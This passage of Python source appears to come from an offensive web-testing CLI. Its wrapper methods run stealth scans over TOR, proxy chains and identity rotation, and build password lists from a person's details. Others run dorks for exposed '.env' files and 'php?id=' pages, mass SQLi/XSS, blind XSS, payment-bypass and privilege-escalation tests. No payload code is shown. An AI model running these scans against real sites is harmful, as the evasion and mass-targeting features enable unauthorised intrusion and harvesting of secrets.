        medium = len(details.get('medium', []))
        console.print(f"  [red]Critical: {critical} | High: {high} | Medium: {medium}[/red]")

    def _scan_ai_report_generation(self):
        """298: AI Report Generation"""
        console.print(f"\n[bold magenta][*] AI REPORT GENERATION on {self.target}[/bold magenta]")
        url = f"{self.protocol}{self.target}"
        # Get findings first
        with console.status("[bold cyan]Gathering findings for report...[/bold cyan]"):
            recon_result = run_ai_pentest(url, scan_type='analyze', ai_bridge=self.ai)
        with console.status("[bold magenta]AI generating security report...[/bold cyan]"):
            result = run_ai_pentest(scan_type='report', findings=recon_result, ai_bridge=self.ai)
        self.results['findings']['ai_report_generation'] = result
        report_findings = len(result.get('details', {}).get('findings_report', []))
        console.print(f"  [green]Report entries: {report_findings}[/green]")
        if result.get('ai_full_report'):
            console.print(Panel(result['ai_full_report'][:800], title="[bold magenta]AI Report[/bold magenta]", border_style="magenta"))

    def _scan_ai_full_analysis(self):
        """299: AI Full Analysis"""
        console.print(f"\n[bold red][*] AI FULL ANALYSIS on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Running full AI analysis pipeline (6 phases)...[/bold cyan]"):
            result = run_ai_pentest(url, scan_type='full', ai_bridge=self.ai)
        self.results['findings']['ai_full_analysis'] = result
        total_insights = result.get('details', {}).get('total_insights', 0)
        console.print(f"  [green]Total insights across 6 phases: {total_insights}[/green]")

    def _scan_stealth_mode(self):
        """300: Stealth Scan Mode"""
        console.print(f"\n[bold cyan][*] STEALTH SCAN on {self.target}[/bold cyan]")
        profile = Prompt.ask("[yellow]Stealth profile[/yellow]", default="cautious",
                             choices=["normal", "cautious", "sneaky", "paranoid"])
        url = f"{self.protocol}{self.target}"
        with console.status(f"[bold cyan]Scanning with stealth profile: {profile}...[/bold cyan]"):
            result = run_stealth_scan(url, scan_type='stealth', profile=profile)
        self.results['findings']['stealth_mode'] = result
        findings = len(result.get('findings', []))
        requests = result.get('details', {}).get('requests_made', 0)
        rotations = result.get('details', {}).get('identities_rotated', 0)
        console.print(f"  [green]Findings: {findings} | Requests: {requests} | Identity Rotations: {rotations}[/green]")

    def _scan_tor_routed(self):
        """301: TOR-Routed Scan"""
        console.print(f"\n[bold magenta][*] TOR-ROUTED SCAN on {self.target}[/bold magenta]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold magenta]Setting up TOR and scanning...[/bold cyan]"):
            result = run_stealth_scan(url, scan_type='tor')
        self.results['findings']['tor_routed'] = result
        tor_active = result.get('details', {}).get('tor_active', False)
        findings = len(result.get('findings', []))
        console.print(f"  [green]TOR Active: {tor_active} | Findings: {findings}[/green]")

    def _scan_proxy_chain(self):
        """302: Proxy Chain Scan"""
        console.print(f"\n[bold cyan][*] PROXY CHAIN SCAN on {self.target}[/bold cyan]")
        proxy_input = Prompt.ask("[yellow]Proxy list (comma-separated or file path)[/yellow]", default="")
        url = f"{self.protocol}{self.target}"
        proxy_list = [p.strip() for p in proxy_input.split(',') if p.strip()] if proxy_input else []
        with console.status("[bold cyan]Setting up proxy chain and scanning...[/bold cyan]"):
            result = run_stealth_scan(url, scan_type='proxy', proxy_list=proxy_list)
        self.results['findings']['proxy_chain'] = result
        findings = len(result.get('findings', []))
        console.print(f"  [green]Findings: {findings}[/green]")

    def _scan_slow_mode(self):
        """303: Slow Scan Mode"""
        console.print(f"\n[bold yellow][*] SLOW SCAN on {self.target}[/bold yellow]")
        console.print("[yellow]This will take significantly longer...[/yellow]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold yellow]Running slow scan (paranoid timing)...[/bold cyan]"):
            result = run_stealth_scan(url, scan_type='slow', profile='paranoid')
        self.results['findings']['slow_mode'] = result
        findings = len(result.get('findings', []))
        elapsed = result.get('details', {}).get('elapsed_time', 0)
        console.print(f"  [green]Findings: {findings} | Elapsed: {elapsed:.0f}s[/green]")

    def _scan_stealth_full(self):
        """304: Stealth Full Scan"""
        console.print(f"\n[bold red][*] STEALTH FULL SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Running full stealth scan (TOR + proxy + rotation)...[/bold cyan]"):
            result = run_stealth_scan(url, scan_type='full', profile='cautious')
        self.results['findings']['stealth_full'] = result
        details = result.get('details', {})
        findings = len(result.get('findings', []))
        console.print(f"  [green]Findings: {findings} | Requests: {details.get('total_requests', 0)} | Rotations: {details.get('identity_rotations', 0)}[/green]")

    def _scan_wordlist_target(self):
        """305: Wordlist Target Generation"""
        console.print(f"\n[bold cyan][*] WORDLIST TARGET GENERATION on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Crawling target and generating wordlist...[/bold cyan]"):
            result = run_wordlist_gen(url, scan_type='target')
        self.results['findings']['wordlist_target'] = result
        words = result.get('details', {}).get('words_extracted', 0)
        console.print(f"  [green]Words extracted: {words}[/green]")

    def _scan_wordlist_password(self):
        """306: Wordlist Password Generation"""
        console.print(f"\n[bold cyan][*] WORDLIST PASSWORD GENERATION[/bold cyan]")
        first = Prompt.ask("[yellow]First name[/yellow]", default="admin")
        last = Prompt.ask("[yellow]Last name[/yellow]", default="user")
        birthday = Prompt.ask("[yellow]Birthday (YYYY-MM-DD, optional)[/yellow]", default="")
        company = Prompt.ask("[yellow]Company (optional)[/yellow]", default="")
        info = {'first': first, 'last': last}
        if birthday:
            info['birthday'] = birthday
        if company:
            info['company'] = company
        with console.status("[bold cyan]Generating password list...[/bold cyan]"):
            result = run_wordlist_gen(scan_type='password', info=info)
        self.results['findings']['wordlist_password'] = result
        total = result.get('details', {}).get('total_generated', 0)
        console.print(f"  [green]Password candidates generated: {total}[/green]")

    def _scan_wordlist_subdomain(self):
        """307: Wordlist Subdomain Generation"""
        console.print(f"\n[bold cyan][*] WORDLIST SUBDOMAIN GENERATION for {self.target}[/bold cyan]")
        domain = self.target.replace('https://', '').replace('http://', '').split('/')[0]
        with console.status("[bold cyan]Generating subdomain wordlist...[/bold cyan]"):
            result = run_wordlist_gen(domain, scan_type='subdomain')
        self.results['findings']['wordlist_subdomain'] = result
        total = result.get('details', {}).get('total_generated', 0)
        builtin = result.get('details', {}).get('builtin_count', 0)
        console.print(f"  [green]Subdomains: {total} (built-in: {builtin})[/green]")

    def _scan_wordlist_username(self):
        """308: Wordlist Username Generation"""
        console.print(f"\n[bold cyan][*] WORDLIST USERNAME GENERATION[/bold cyan]")
        first = Prompt.ask("[yellow]First name[/yellow]", default="john")
        last = Prompt.ask("[yellow]Last name[/yellow]", default="doe")
        email = Prompt.ask("[yellow]Email (optional)[/yellow]", default="")
        info = {'first': first, 'last': last}
        if email:
            info['email'] = email
        with console.status("[bold cyan]Generating username permutations...[/bold cyan]"):
            result = run_wordlist_gen(scan_type='username', info=info)
        self.results['findings']['wordlist_username'] = result
        total = result.get('details', {}).get('total_generated', 0)
        console.print(f"  [green]Username permutations: {total}[/green]")

    def _scan_wordlist_full(self):
        """309: Wordlist Full Generation"""
        console.print(f"\n[bold red][*] WORDLIST FULL GENERATION for {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Running full wordlist generation (target + subdomain + mutations)...[/bold cyan]"):
            result = run_wordlist_gen(url, scan_type='full')
        self.results['findings']['wordlist_full'] = result
        total = result.get('details', {}).get('combined_total', 0)
        console.print(f"  [green]Combined wordlist: {total} words[/green]")

    def _scan_ai_stealth_combined(self):
        """310: AI + Stealth Combined"""
        console.print(f"\n[bold red][*] AI + STEALTH COMBINED on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        all_results = {}

        # Phase 1: Stealth Recon
        console.print(f"\n[bold cyan]=== Phase 1: Stealth Reconnaissance ===[/bold cyan]")
        with console.status("[bold cyan]Running stealth scan...[/bold cyan]"):
            all_results['stealth'] = run_stealth_scan(url, scan_type='stealth', profile='cautious')

        # Phase 2: AI Analysis of stealth findings
        console.print(f"\n[bold magenta]=== Phase 2: AI Analysis of Stealth Findings ===[/bold magenta]")
        with console.status("[bold magenta]AI analyzing stealth results...[/bold cyan]"):
            all_results['ai_analysis'] = run_ai_pentest(scan_type='interpret', scan_results=all_results['stealth'], ai_bridge=self.ai)

        # Phase 3: AI Attack Strategy
        console.print(f"\n[bold yellow]=== Phase 3: AI Attack Strategy ===[/bold yellow]")
        with console.status("[bold yellow]AI generating attack strategies...[/bold cyan]"):
            all_results['ai_strategy'] = run_ai_pentest(scan_type='attack', findings=all_results['stealth'], ai_bridge=self.ai)

        self.results['findings']['ai_stealth_combined'] = all_results
        stealth_findings = len(all_results.get('stealth', {}).get('findings', []))
        console.print(f"  [green]Stealth Findings: {stealth_findings}[/green]")

    def _scan_stealth_identity_rotation(self):
        """311: Stealth Identity Rotation"""
        console.print(f"\n[bold cyan][*] STEALTH IDENTITY ROTATION on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        count = Prompt.ask("[yellow]Number of rotations[/yellow]", default="10")
        with console.status(f"[bold cyan]Rotating identity {count} times...[/bold cyan]"):
            result = run_stealth_scan(url, scan_type='rotate', count=int(count))
        self.results['findings']['stealth_identity_rotation'] = result
        differences = result.get('details', {}).get('differences_detected', 0)
        console.print(f"  [green]Identity differences detected: {differences}[/green]")

    def _scan_ai_interpret_results(self):
        """312: AI Interpret Results"""
        console.print(f"\n[bold magenta][*] AI INTERPRET RESULTS on {self.target}[/bold magenta]")
        # Use existing scan results if available
        if self.results and self.results.get('findings'):
            scan_data = self.results
        else:
            console.print("[yellow][!] No previous scan results. Running quick recon first...[/yellow]")
            url = f"{self.protocol}{self.target}"
            with console.status("[bold cyan]Quick recon...[/bold cyan]"):
                scan_data = run_ai_pentest(url, scan_type='analyze', ai_bridge=self.ai)

        with console.status("[bold magenta]AI interpreting results...[/bold cyan]"):
            result = run_ai_pentest(scan_type='interpret', scan_results=scan_data, ai_bridge=self.ai)
        self.results['findings']['ai_interpret_results'] = result
        risk_level = result.get('details', {}).get('risk_level', 'Unknown')
        risk_score = result.get('details', {}).get('risk_score', 0)
        console.print(f"  [green]Risk Level: {risk_level} (Score: {risk_score:.1f}/100)[/green]")
        if result.get('ai_interpretation'):
            console.print(Panel(result['ai_interpretation'][:500], title="[bold magenta]AI Interpretation[/bold magenta]", border_style="magenta"))

    def _scan_ai_stealth_wordlist_combined(self):
        """313: AI + Stealth + Wordlist Combined"""
        console.print(f"\n[bold red][*] AI + STEALTH + WORDLIST COMBINED on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        domain = self.target.replace('https://', '').replace('http://', '').split('/')[0]
        all_results = {}

        # Phase 1: Stealth Recon
        console.print(f"\n[bold cyan]=== Phase 1: Stealth Reconnaissance ===[/bold cyan]")
        with console.status("[bold cyan]Running stealth scan...[/bold cyan]"):
            all_results['stealth'] = run_stealth_scan(url, scan_type='stealth', profile='cautious')

        # Phase 2: Wordlist Generation
        console.print(f"\n[bold yellow]=== Phase 2: Wordlist Generation ===[/bold yellow]")
        with console.status("[bold yellow]Generating target wordlist...[/bold cyan]"):
            all_results['wordlist_target'] = run_wordlist_gen(url, scan_type='target')
        with console.status("[bold yellow]Generating subdomain wordlist...[/bold cyan]"):
            all_results['wordlist_subdomain'] = run_wordlist_gen(domain, scan_type='subdomain')

        # Phase 3: AI Analysis
        console.print(f"\n[bold magenta]=== Phase 3: AI Analysis ===[/bold magenta]")
        with console.status("[bold magenta]AI analyzing combined results...[/bold cyan]"):
            all_results['ai_analysis'] = run_ai_pentest(scan_type='interpret', scan_results=all_results['stealth'], ai_bridge=self.ai)

        # Phase 4: AI Strategy
        console.print(f"\n[bold red]=== Phase 4: AI Attack Strategy ===[/bold red]")
        with console.status("[bold red]AI generating strategies...[/bold cyan]"):
            all_results['ai_strategy'] = run_ai_pentest(scan_type='attack', findings=all_results['stealth'], ai_bridge=self.ai)

        # Phase 5: AI Report
        console.print(f"\n[bold yellow]=== Phase 5: AI Report ===[/bold yellow]")
        with console.status("[bold yellow]AI generating report...[/bold cyan]"):
            all_results['ai_report'] = run_ai_pentest(scan_type='report', findings=all_results['stealth'], ai_bridge=self.ai)

        self.results['findings']['ai_stealth_wordlist_combined'] = all_results
        total = sum(len(r.get('findings', [])) if isinstance(r.get('findings'), list) else 1 for r in all_results.values() if isinstance(r, dict))
        console.print(f"\n[bold green][+] Combined scan complete: {total} total findings across 5 phases[/bold green]")

    # ========================================================================
    # v5.0 FUSION Batch 10 - Dalfox XSS + Mass Vuln + BizLogic Engines (Task 7a)
    # Scan IDs 314-333
    # ========================================================================

    def _scan_dalfox_quick(self):
        """314: Dalfox XSS Quick Scan"""
        console.print(f"\n[bold red][*] DALFOX XSS QUICK SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Running Dalfox XSS quick scan...[/bold cyan]"):
            result = run_dalfox_scan(url, scan_type='quick')
        self.results['findings']['dalfox_quick'] = result
        vulns = len(result.get('findings', []))
        console.print(f"  [green]XSS findings: {vulns}[/green]")

    def _scan_dalfox_mass(self):
        """315: Dalfox XSS Mass Scan"""
        console.print(f"\n[bold red][*] DALFOX XSS MASS SCAN on {self.target}[/bold red]")
        url_file = Prompt.ask("[yellow]Enter URL list file path[/yellow]", default="urls.txt")
        with console.status("[bold cyan]Running Dalfox mass XSS scan...[/bold cyan]"):
            result = run_dalfox_scan(f"{self.protocol}{self.target}", scan_type='mass', url_file=url_file)
        self.results['findings']['dalfox_mass'] = result
        vulns = result.get('details', {}).get('vulnerable_count', 0)
        console.print(f"  [green]Vulnerable URLs: {vulns}[/green]")

    def _scan_dalfox_blind(self):
        """316: Dalfox XSS Blind Test"""
        console.print(f"\n[bold red][*] DALFOX XSS BLIND TEST on {self.target}[/bold red]")
        callback = Prompt.ask("[yellow]Enter callback URL (interactsh/Burp Collaborator)[/yellow]", default="")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Running Dalfox blind XSS test...[/bold cyan]"):
            result = run_dalfox_scan(url, scan_type='blind', callback_url=callback)
        self.results['findings']['dalfox_blind'] = result
        injected = result.get('details', {}).get('payloads_injected', 0)
        console.print(f"  [green]Blind payloads injected: {injected}[/green]")

    def _scan_dalfox_dom(self):
        """317: Dalfox XSS DOM Test"""
        console.print(f"\n[bold red][*] DALFOX XSS DOM TEST on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Running Dalfox DOM XSS analysis...[/bold cyan]"):
            result = run_dalfox_scan(url, scan_type='dom')
        self.results['findings']['dalfox_dom'] = result
        flows = len(result.get('details', {}).get('potential_flows', []))
        console.print(f"  [green]DOM XSS flows: {flows}[/green]")

    def _scan_dalfox_full(self):
        """318: Dalfox XSS Full Scan"""
        console.print(f"\n[bold red][*] DALFOX XSS FULL SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Running Dalfox full XSS scan (4 phases)...[/bold cyan]"):
            result = run_dalfox_scan(url, scan_type='full')
        self.results['findings']['dalfox_full'] = result
        phases = len(result.get('details', {}).get('phases_completed', []))
        vulns = len(result.get('findings', []))
        console.print(f"  [green]Phases completed: {phases} | Total findings: {vulns}[/green]")

    def _scan_mass_dork(self):
        """319: Mass Dork Scan"""
        console.print(f"\n[bold red][*] MASS DORK SCAN on {self.target}[/bold red]")
        domain = self.target.replace('https://', '').replace('http://', '').split('/')[0]
        dork_category = Prompt.ask("[yellow]Dork category (sqli/sensitive/xss/custom)[/yellow]", default="sqli")
        dork_map = {
            'sqli': f'site:{domain} inurl:"php?id="',
            'sensitive': f'site:{domain} filetype:env',
            'xss': f'site:{domain} inurl:"q="',
        }
        dork = dork_map.get(dork_category, dork_category)
        pages = int(Prompt.ask("[yellow]Pages to scan[/yellow]", default="3"))
        with console.status(f"[bold cyan]Running dork scan: {dork}...[/bold cyan]"):
            result = run_mass_vuln_scan(scan_type='dork', dork=dork, pages=pages)
        self.results['findings']['mass_dork'] = result
        urls = result.get('details', {}).get('total_urls', 0)
        console.print(f"  [green]URLs harvested: {urls}[/green]")

    def _scan_mass_sqli(self):
        """320: Mass SQLi Detection"""
        console.print(f"\n[bold red][*] MASS SQLI DETECTION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Running mass SQLi detection...[/bold cyan]"):
            result = run_mass_vuln_scan(target=url, scan_type='sqli')
        self.results['findings']['mass_sqli'] = result
        vulns = result.get('details', {}).get('vulnerable_count', 0)
        console.print(f"  [green]SQLi vulnerabilities: {vulns}[/green]")

    def _scan_mass_xss(self):
        """321: Mass XSS Detection"""
        console.print(f"\n[bold red][*] MASS XSS DETECTION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Running mass XSS detection...[/bold cyan]"):
            result = run_mass_vuln_scan(target=url, scan_type='xss')
        self.results['findings']['mass_xss'] = result
        vulns = result.get('details', {}).get('vulnerable_count', 0)
        console.print(f"  [green]XSS vulnerabilities: {vulns}[/green]")

    def _scan_multi_vuln(self):
        """322: Multi-Vuln Concurrent Scan"""
        console.print(f"\n[bold red][*] MULTI-VULN CONCURRENT SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Running multi-vuln concurrent scan (SQLi+XSS+LFI+Sensitive)...[/bold cyan]"):
            result = run_mass_vuln_scan(target=url, scan_type='multi')
        self.results['findings']['multi_vuln'] = result
        details = result.get('details', {})
        console.print(f"  [green]SQLi: {details.get('sqli_findings', 0)} | "
                      f"XSS: {details.get('xss_findings', 0)} | "
                      f"LFI: {details.get('lfi_findings', 0)} | "
                      f"Sensitive: {details.get('sensitive_findings', 0)}[/green]")

    def _scan_mass_file(self):
        """323: Mass Scan from File"""
        console.print(f"\n[bold red][*] MASS SCAN FROM FILE[/bold red]")
        file_path = Prompt.ask("[yellow]Enter target list file path[/yellow]", default="targets.txt")
        with console.status("[bold cyan]Running mass scan from file...[/bold cyan]"):
            result = run_mass_vuln_scan(scan_type='file', file_path=file_path)
        self.results['findings']['mass_file'] = result
        vulns = result.get('details', {}).get('vulnerable_targets', 0)
        total = result.get('details', {}).get('targets', 0)
        console.print(f"  [green]Vulnerable: {vulns}/{total} targets[/green]")

    def _scan_bizlogic_price(self):
        """324: Business Logic Price Manipulation"""
        console.print(f"\n[bold red][*] BUSINESS LOGIC PRICE MANIPULATION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing price manipulation...[/bold cyan]"):
            result = run_bizlogic_scan(url, scan_type='price')
        self.results['findings']['bizlogic_price'] = result
        issues = result.get('details', {}).get('manipulation_found', 0)
        console.print(f"  [green]Price manipulation issues: {issues}[/green]")

    def _scan_bizlogic_payment(self):
        """325: Business Logic Payment Bypass"""
        console.print(f"\n[bold red][*] BUSINESS LOGIC PAYMENT BYPASS on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing payment bypass...[/bold cyan]"):
            result = run_bizlogic_scan(url, scan_type='payment')
        self.results['findings']['bizlogic_payment'] = result
        issues = result.get('details', {}).get('bypass_found', 0)
        console.print(f"  [green]Payment bypass issues: {issues}[/green]")

    def _scan_bizlogic_privilege(self):
        """326: Business Logic Privilege Escalation"""
        console.print(f"\n[bold red][*] BUSINESS LOGIC PRIVILEGE ESCALATION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing privilege escalation...[/bold cyan]"):
            result = run_bizlogic_scan(url, scan_type='privilege')
        self.results['findings']['bizlogic_privilege'] = result
        issues = result.get('details', {}).get('escalation_found', 0)
        console.print(f"  [green]Privilege escalation issues: {issues}[/green]")

    def _scan_bizlogic_race(self):
        """327: Business Logic Race Condition"""
        console.print(f"\n[bold red][*] BUSINESS LOGIC RACE CONDITION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing race condition in business operations...[/bold cyan]"):
            result = run_bizlogic_scan(url, scan_type='race')
        self.results['findings']['bizlogic_race'] = result
        issues = result.get('details', {}).get('race_found', 0)
        console.print(f"  [green]Race condition issues: {issues}[/green]")

    def _scan_bizlogic_full(self):
        """328: Business Logic Full Scan"""
        console.print(f"\n[bold red][*] BUSINESS LOGIC FULL SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Running business logic full scan (7 phases)...[/bold cyan]"):
            result = run_bizlogic_scan(url, scan_type='full')
        self.results['findings']['bizlogic_full'] = result
        phases = len(result.get('details', {}).get('phases_completed', []))
        issues = result.get('details', {}).get('total_issues', 0)
        console.print(f"  [green]Phases: {phases} | Total issues: {issues}[/green]")

    def _scan_dalfox_params(self):
        """329: Dalfox Parameter Analysis"""
        console.print(f"\n[bold red][*] DALFOX PARAMETER ANALYSIS on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Analyzing parameters for reflection...[/bold cyan]"):
            result = run_dalfox_scan(url, scan_type='param_analysis')
        self.results['findings']['dalfox_params'] = result
        params_tested = result.get('details', {}).get('params_tested', 0)
        reflected = len(result.get('details', {}).get('params_reflected', [])) + len(result.get('details', {}).get('mined_params', []))
        console.print(f"  [green]Params tested: {params_tested} | Reflected: {reflected}[/green]")

    def _scan_mass_classify(self):
        """330: Mass Vuln Classification"""
        console.print(f"\n[bold red][*] MASS VULN CLASSIFICATION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        # First run a multi-vuln scan, then classify
        with console.status("[bold cyan]Running scan for classification...[/bold cyan]"):
            scan_result = run_mass_vuln_scan(target=url, scan_type='multi')
        with console.status("[bold cyan]Classifying vulnerabilities...[/bold cyan]"):
            result = run_mass_vuln_scan(scan_type='classify', results=[scan_result])
        self.results['findings']['mass_classify'] = result
        total = result.get('details', {}).get('total_classified', 0)
        critical = len(result.get('details', {}).get('by_severity', {}).get('critical', []))
        high = len(result.get('details', {}).get('by_severity', {}).get('high', []))
        console.print(f"  [green]Classified: {total} vulns | Critical: {critical} | High: {high}[/green]")

    def _scan_bizlogic_cart(self):
        """331: Business Logic Cart Manipulation"""
        console.print(f"\n[bold red][*] BUSINESS LOGIC CART MANIPULATION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing cart manipulation...[/bold cyan]"):
            result = run_bizlogic_scan(url, scan_type='cart')
        self.results['findings']['bizlogic_cart'] = result
        issues = result.get('details', {}).get('manipulation_found', 0)
        console.print(f"  [green]Cart manipulation issues: {issues}[/green]")

    def _scan_bizlogic_discount(self):
        """332: Business Logic Discount Abuse"""
        console.print(f"\n[bold red][*] BUSINESS LOGIC DISCOUNT ABUSE on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing discount/coupon abuse...[/bold cyan]"):
            result = run_bizlogic_scan(url, scan_type='discount')
        self.results['findings']['bizlogic_discount'] = result
        issues = result.get('details', {}).get('abuse_found', 0)
        console.print(f"  [green]Discount abuse issues: {issues}[/green]")

    def _scan_mass_bizlogic_combined(self):
        """333: Mass + BizLogic Combined Scan"""
        console.print(f"\n[bold red][*] MASS + BIZLOGIC COMBINED SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        all_results = {}

        # Phase 1: Multi-Vuln Scan
        console.print(f"\n[bold cyan]=== Phase 1: Multi-Vuln Scan ===[/bold cyan]")
        with console.status("[bold cyan]Running multi-vuln scan...[/bold cyan]"):
            all_results['multi_vuln'] = run_mass_vuln_scan(target=url, scan_type='multi')

        # Phase 2: Business Logic Scan
        console.print(f"\n[bold yellow]=== Phase 2: Business Logic Scan ===[/bold yellow]")
        with console.status("[bold yellow]Running business logic scan...[/bold cyan]"):
            all_results['bizlogic'] = run_bizlogic_scan(url, scan_type='full')

        # Phase 3: Vulnerability Classification
        console.print(f"\n[bold magenta]=== Phase 3: Vulnerability Classification ===[/bold magenta]")
        with console.status("[bold magenta]Classifying all findings...[/bold cyan]"):
            all_results['classification'] = run_mass_vuln_scan(
                scan_type='classify',
                results=[all_results['multi_vuln'], all_results['bizlogic']]
            )

        self.results['findings']['mass_bizlogic_combined'] = all_results
        multi_vulns = all_results.get('multi_vuln', {}).get('details', {}).get('total_tests', 0)
        bizlogic_issues = all_results.get('bizlogic', {}).get('details', {}).get('total_issues', 0)
        console.print(f"\n[bold green][+] Combined scan complete: {multi_vulns} vuln + {bizlogic_issues} bizlogic findings[/bold green]")

    # ========================================================================
    # Scan IDs 334-353: WebSocket + H2C Smuggling + Prototype Pollution
    # ========================================================================

    def _scan_ws_endpoint_discovery(self):
        """334: WebSocket Endpoint Discovery"""
        console.print(f"\n[bold red][*] WEBSOCKET ENDPOINT DISCOVERY on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Discovering WebSocket endpoints...[/bold cyan]"):
            result = run_ws_scan(url, scan_type='discovery')
        self.results['findings']['ws_endpoint_discovery'] = result
        endpoints = result.get('details', {}).get('endpoints_found', [])
        console.print(f"  [green]WebSocket endpoints found: {len(endpoints)}[/green]")

    def _scan_ws_auth_testing(self):
        """335: WebSocket Auth Testing"""
        console.print(f"\n[bold red][*] WEBSOCKET AUTH TESTING on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing WebSocket authentication...[/bold cyan]"):
            result = run_ws_scan(url, scan_type='auth')
        self.results['findings']['ws_auth_testing'] = result
        bypasses = result.get('details', {}).get('auth_bypasses', [])
        console.print(f"  [green]Auth bypasses found: {len(bypasses)}[/green]")

    def _scan_ws_message_fuzzing(self):
        """336: WebSocket Message Fuzzing"""
        console.print(f"\n[bold red][*] WEBSOCKET MESSAGE FUZZING on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Fuzzing WebSocket messages...[/bold cyan]"):
            result = run_ws_scan(url, scan_type='fuzz')
        self.results['findings']['ws_message_fuzzing'] = result
        payloads = result.get('details', {}).get('payloads_sent', 0)
        interesting = len(result.get('details', {}).get('interesting_responses', []))
        console.print(f"  [green]Payloads sent: {payloads}, Interesting: {interesting}[/green]")

    def _scan_ws_cross_origin(self):
        """337: WebSocket Cross-Origin Test"""
        console.print(f"\n[bold red][*] WEBSOCKET CROSS-ORIGIN TEST on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing cross-origin WebSocket hijacking...[/bold cyan]"):
            result = run_ws_scan(url, scan_type='cross_origin')
        self.results['findings']['ws_cross_origin'] = result
        origins = result.get('details', {}).get('accepted_origins', [])
        console.print(f"  [green]Accepted origins: {len(origins)}[/green]")

    def _scan_ws_full(self):
        """338: WebSocket Full Scan"""
        console.print(f"\n[bold red][*] WEBSOCKET FULL SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Running full WebSocket security scan...[/bold cyan]"):
            result = run_ws_scan(url, scan_type='full')
        self.results['findings']['ws_full'] = result
        findings_count = len(result.get('findings', []))
        console.print(f"  [green]Total findings: {findings_count}[/green]")

    def _scan_h2c_detection(self):
        """339: H2C Smuggling Detection"""
        console.print(f"\n[bold red][*] H2C SMUGGLING DETECTION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Detecting H2C support...[/bold cyan]"):
            result = run_h2c_scan(url, scan_type='h2c')
        self.results['findings']['h2c_detection'] = result
        paths = result.get('details', {}).get('upgrade_paths', [])
        console.print(f"  [green]H2C upgrade paths found: {len(paths)}[/green]")

    def _scan_clte_detection(self):
        """340: CL.TE Smuggling Detection"""
        console.print(f"\n[bold red][*] CL.TE SMUGGLING DETECTION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Detecting CL.TE smuggling...[/bold cyan]"):
            result = run_h2c_scan(url, scan_type='clte')
        self.results['findings']['clte_detection'] = result
        suspected = any(t.get('suspected') for t in result.get('details', {}).get('timing_results', []))
        console.print(f"  [green]CL.TE suspected: {suspected}[/green]")

    def _scan_tecl_detection(self):
        """341: TE.CL Smuggling Detection"""
        console.print(f"\n[bold red][*] TE.CL SMUGGLING DETECTION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Detecting TE.CL smuggling...[/bold cyan]"):
            result = run_h2c_scan(url, scan_type='tecl')
        self.results['findings']['tecl_detection'] = result
        suspected = any(t.get('suspected') for t in result.get('details', {}).get('timing_results', []))
        console.print(f"  [green]TE.CL suspected: {suspected}[/green]")

    def _scan_smuggling_full(self):
        """342: HTTP Smuggling Full Scan"""
        console.print(f"\n[bold red][*] HTTP SMUGGLING FULL SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Running full HTTP smuggling scan...[/bold cyan]"):
            result = run_h2c_scan(url, scan_type='full')
        self.results['findings']['smuggling_full'] = result
        findings_count = len(result.get('findings', []))
        console.print(f"  [green]Total smuggling findings: {findings_count}[/green]")

    def _scan_server_pp(self):
        """343: Server-Side Prototype Pollution"""
        console.print(f"\n[bold red][*] SERVER-SIDE PROTOTYPE POLLUTION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing server-side prototype pollution...[/bold cyan]"):
            result = run_pp_scan(url, scan_type='server')
        self.results['findings']['server_pp'] = result
        payloads = result.get('details', {}).get('payloads_tested', 0)
        console.print(f"  [green]PP payloads tested: {payloads}[/green]")

    def _scan_client_pp(self):
        """344: Client-Side Prototype Pollution"""
        console.print(f"\n[bold red][*] CLIENT-SIDE PROTOTYPE POLLUTION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing client-side prototype pollution...[/bold cyan]"):
